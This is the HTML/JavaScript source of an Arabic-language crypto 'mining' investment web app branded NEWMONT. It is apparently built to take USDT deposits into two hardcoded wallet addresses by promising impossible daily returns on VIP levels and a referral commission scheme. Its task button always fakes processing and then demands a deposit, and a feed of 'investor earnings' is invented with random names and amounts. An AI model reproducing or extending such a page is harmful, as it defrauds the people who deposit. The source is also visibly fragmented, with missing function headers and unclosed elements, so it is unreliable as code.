<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEWMONT - Ultra Edition Pro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { 
            --bg: #050505; 
            --card: #121212; 
            --accent: #8b5cf6; 
            --accent-light: #a78bfa;
            --text-dim: #9ca3af; 
            --border: #1f2937; 
            --success: #10b981; 
            --gold: #f59e0b; 
            --danger: #ef4444;
            --tg-blue: #24A1DE;
        }
        
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            margin: 0; background: var(--bg); color: white; direction: rtl; 
            overflow-x: hidden; scroll-behavior: smooth;
        }

        .hidden { display: none !important; }

        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(139, 92, 246, 0); } 100% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0); } }
        .fade-in { animation: fadeInUp 0.5s ease forwards; }

        #login-page { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at top, #1e1b4b, #050505); z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .login-container { width: 100%; max-width: 380px; background: rgba(0,0,0,0.6); padding: 30px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(10px); }
        
        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--accent); color: white; padding: 12px 25px; border-radius: 50px; z-index: 11000; font-size: 14px; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--accent-light); }

        .header { background: rgba(5, 5, 5, 0.8); padding: 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; backdrop-filter: blur(15px); }
        .nav { position: fixed; bottom: 0; width: 100%; background: rgba(10, 10, 10, 0.95); display: flex; justify-content: space-around; padding: 10px 0 28px; border-top: 1px solid var(--border); z-index: 90; }
        .nav-item { color: #666; font-size: 11px; text-align: center; flex: 1; cursor: pointer; transition: 0.3s; position: relative; }
        .nav-item.active { color: var(--accent); }
        .nav-item.active i { transform: translateY(-5px); color: var(--accent); }
        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; transition: 0.3s; }

        .card { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 15px; margin-bottom: 15px; }
        .btn-main { background: var(--accent); color: white; padding: 14px; border: none; border-radius: 14px; width: 100%; font-weight: 700; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-main:active { transform: scale(0.96); opacity: 0.9; }
        .btn-pulse { animation: pulse 2s infinite; }

        .addr-display { background: #000; border: 1px dashed var(--accent); padding: 15px; border-radius: 12px; font-size: 12px; word-break: break-all; color: #fff; margin: 15px 0; cursor: pointer; position: relative; }
        .addr-display::after { content: '\f0c5'; font-family: 'Font Awesome 6 Free'; position: absolute; left: 10px; color: var(--accent); }

        .vip-badge { background: linear-gradient(90deg, var(--gold), #ffcf33); color: black; padding: 2px 10px; border-radius: 6px; font-size: 10px; font-weight: 900; }

        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; display: flex; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
        .modal { background: #111; width: 92%; max-width: 400px; border-radius: 28px; padding: 25px; border: 1px solid #333; animation: fadeInUp 0.3s ease; position: relative; max-height: 85vh; overflow-y: auto; }
        
        .close-modal { position: absolute; top: 15px; left: 15px; color: var(--text-dim); font-size: 20px; cursor: pointer; padding: 5px; }

        .input-box { background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px; width: 100%; color: white; margin-bottom: 12px; outline: none; font-size: 14px; }
        .network-selector { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
        .net-btn { background: #1a1a1a; border: 1px solid var(--border); color: var(--text-dim); padding: 8px; border-radius: 10px; font-size: 11px; cursor: pointer; transition: 0.3s; }
        .net-btn.active { border-color: var(--accent); color: white; background: rgba(139, 92, 246, 0.1); }

        .live-dot { height: 8px; width: 8px; background: var(--success); border-radius: 50%; display: inline-block; margin-left: 5px; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        .history-item { border-bottom: 1px solid #1a1a1a; padding: 12px 0; display: flex; justify-content: space-between; align-items: center; }
        .status-pending { color: var(--gold); font-size: 10px; }
        .status-success { color: var(--success); font-size: 10px; }

        /* ستايل إضافي لصفحة الفريق */
        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .stat-box { background: rgba(255,255,255,0.03); border: 1px solid var(--border); padding: 12px; border-radius: 15px; text-align: center; }
        .level-card { background: #1a1a1a; border-radius: 15px; padding: 15px; margin-bottom: 10px; border-right: 4px solid var(--accent); }
    </style>
</head>
<body>

    <div id="toast">تم النسخ بنجاح ✅</div>

    <!-- تسجيل الدخول -->
    <div id="login-page">
        <div class="login-container fade-in">

    <!-- التطبيق الرئيسي -->

        <div id="main-content" style="padding-bottom: 110px;"></div>

        <nav class="nav">

            <div class="nav-item" onclick="navTo('task')" id="n-task"><i class="fa-solid fa-screwdriver-wrench"></i>مهام</div>

    <!-- نافذة الإيداع -->
    <div id="deposit-modal" class="overlay hidden">
        <div class="modal">
            <i class="fa-solid fa-xmark close-modal" onclick="closeModals()"></i>
            <h3 style="text-align:center; margin-top:0;">إيداع USDT</h3>
            <div style="display:flex; gap:10px; margin-bottom:20px;">
                <button class="btn-main" id="btn-trc" style="flex:1; background:var(--accent);" onclick="switchWallet('TRC')">TRC20</button>
                <button class="btn-main" id="btn-bnb" style="flex:1; background:#222;" onclick="switchWallet('BNB')">BEP20</button>
            </div>

            <input type="number" id="withdraw-amount" class="input-box" placeholder="المبلغ (بحد أدنى 2 USDT)">

    <script>
        const wallets = { 'TRC': 'TD7E5roEGQq4gS3N6L1abw5BW2E6qodCqo', 'BNB': '0xa70850a7d21f63daf498d1a1885692bdda8b1cde' };
        let currentBalance = 0.00;
        let selectedNetwork = 'TRC20';

            const t = document.getElementById('toast');
            t.innerText = msg; t.style.display = 'block';
            setTimeout(() => { t.style.display = 'none'; }, 2000);

        function copyAddr(txt) {
            const target = txt || document.getElementById('addr-text').innerText;

            const e = document.getElementById('login-email').value;

                cont.innerHTML = `

                            <div onclick="openTelegram()" style="text-align:center; background:var(--card); padding:15px 5px; border-radius:18px;"><i class="fa-brands fa-telegram" style="color:var(--tg-blue); font-size:22px;"></i><div style="font-size:11px; margin-top:8px;">دعم</div></div>

                            </div>
                            <div class="stat-box">
                                <div style="font-size:10px; color:var(--text-dim);">أرباح الفريق</div>

                                <div>
                                    <div style="font-weight:bold;">المستوى A (الأول)</div>

                                </div>
                                <div style="color:var(--success); font-weight:900; font-size:20px;">12%</div>

                            <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
                                <div style="width:60px; height:60px; background:var(--accent); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:25px;"><i class="fa-solid fa-user-tie"></i></div>
                                <div><div style="font-weight:bold;">User_99283 <span class="vip-badge">NEW</span></div><div style="font-size:11px; color:var(--text-dim);">ID: 883902110</div></div>
                            </div>
                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                                <div><div style="font-size:10px; color:var(--text-dim);">رصيد الحساب</div><div style="font-size:18px; font-weight:900;">${currentBalance.toFixed(2)} <span style="font-size:12px;">USDT</span></div></div>
                                <div><div style="font-size:10px; color:var(--text-dim);">إجمالي السحب</div><div style="font-size:18px; font-weight:900; color:var(--success);">0.00</div></div>
                            </div>
                        </div>
                        <div style="margin:15px;">
                            <div class="card" style="padding:5px 15px;">

            } else if(page === 'task') {
                cont.innerHTML = `<div class="fade-in" style="padding: 20px;"><div class="card" style="text-align:center; border-style: dashed; border-color: var(--accent);"><div style="color:var(--text-dim); font-size:12px;">مؤقت تجديد المهام</div><div id="timer" style="font-size:24px; font-weight:900; color:var(--gold); margin:5px 0;">00:00:00</div></div><div class="card fade-in" style="display:flex; align-items:center; gap:15px; border-right: 4px solid var(--success); background: linear-gradient(to left, #050505, #121212);"><div style="background:#1a1a1a; width:50px; height:50px; border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid fa-chart-line" style="color:var(--success);"></i></div><div style="flex:1;"><h4 style="margin:0;">خوارزمية الربح القصوى</h4><div style="color:var(--success); font-weight:bold; font-size:14px;">+ 65.00 USDT</div></div><button class="btn-main" style="width:auto; padding:8px 20px;" onclick="doTask()">تنفيذ</button></div></div>`;
                startTimer();
            } else if(page === 'vip') {
                let vips = [{l:'SPECIAL', p:55, d:65.0},{l:1, p:10, d:2.5},{l:2, p:20, d:5.0},{l:3, p:30, d:7.5}];
                let html = `<div class="fade-in" style="padding:20px;"><h3>مستويات التعدين</h3>`;
                vips.forEach(v => {
                    html += `<div class="card fade-in" style="position:relative; overflow:hidden; border: 1px solid ${v.l==='SPECIAL'?'var(--success)':'var(--border)'}"><div style="display:flex; justify-content:space-between; align-items:center;"><div><h4 style="margin:0;">LEVEL VIP ${v.l}</h4><div style="font-size:12px; color:var(--text-dim); margin-top:5px;">سعر الاشتراك: ${v.p} USDT</div></div><div style="text-align:left;"><div style="color:var(--success); font-weight:bold;">${v.d} USDT</div><div style="font-size:10px; color:var(--text-dim);">ربح يومي</div></div></div><button class="btn-main" style="margin-top:15px; background: ${v.l==='SPECIAL'?'var(--success)':'#222'}" onclick="openDeposit()">${v.l==='SPECIAL'?'ترقية الآن':'قفل المخطط'}</button></div>`;
                });
                cont.innerHTML = html + `</div>`;
            }
        }

        function openDeposit() { document.getElementById('deposit-modal').classList.remove('hidden'); }
        function openWithdraw() { document.getElementById('with-bal').innerText = currentBalance.toFixed(2); document.getElementById('withdraw-modal').classList.remove('hidden'); }
        function closeModals() { document.querySelectorAll('.overlay').forEach(m => m.classList.add('hidden')); }
        function switchWallet(type) {
            document.getElementById('btn-trc').style.background = (type === 'TRC') ? 'var(--accent)' : '#222';
            document.getElementById('btn-bnb').style.background = (type === 'BNB') ? 'var(--accent)' : '#222';
            document.getElementById('addr-text').innerText = wallets[type];
        }
        function doTask() {
            showToast("جاري المعالجة...");
            setTimeout(() => { alert("يجب تفعيل المستوى المخصص أولاً."); openDeposit(); }, 1500);
        }
        function startTimer() {
            setInterval(() => {
                const t = document.getElementById('timer'); if(!t) return;
                const now = new Date();
                const h = 23 - now.getHours(), m = 59 - now.getMinutes(), s = 59 - now.getSeconds();
                t.innerText = `${h<10?'0'+h:h}:${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
            }, 1000);
        }
        function renderInvestors() {
            const list = document.getElementById('investor-list'); if(!list) return;
            const names = ['Khalid', 'Samy_2', 'Mona_T', 'CryptoPro', 'Ali99'];
            let h = "";
            for(let i=0; i<6; i++) {
                const n = names[Math.floor(Math.random()*names.length)];
                const a = (Math.random()*200 + 5).toFixed(2);
                h += `<div class="card fade-in" style="margin-bottom:8px; padding:10px 15px; display:flex; justify-content:space-between; align-items:center; background:#0a0a0a;"><div style="font-size:12px;"><i class="fa-solid fa-circle-user" style="margin-left:8px; color:#444;"></i> ${n}****</div><div style="color:var(--gold); font-size:12px; font-weight:bold;">+ ${a} USDT</div></div>`;
            }
            list.innerHTML = h;
        }
        function openTelegram() { window.open('https://t.me/NEWMONTServer_bot', '_blank'); }
        function logout() { localStorage.clear(); location.reload(); }
        window.onload = () => { if(localStorage.getItem('logged')) { document.getElementById('login-page').classList.add('hidden'); document.getElementById('app').classList.remove('hidden'); navTo('home'); } };
    </script>
</body>
</html>
